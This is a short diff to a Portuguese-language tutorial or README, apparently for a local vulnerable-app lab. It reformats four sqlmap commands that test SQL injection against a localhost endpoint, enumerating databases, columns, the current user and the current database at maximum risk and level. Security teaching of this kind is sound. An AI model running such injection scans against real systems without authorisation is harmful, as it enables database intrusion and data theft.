@@ -40,8 +40,14 @@ Execute o seguinte comando para testar a vulnerabilidade de SQL Injection no end
 
  ```bash
     python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --ignore-code 404 --dbs --risk=3 --level=5
+```
+```bash
     python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --ignore-code 404 --columns --risk=3 --level=5
+```
+```bash
     python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --ignore-code 404 --current-user --risk=3 --level=5
+```
+```bash
     python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --ignore-code 404 --current-db --risk=3 --level=5
  ```
 
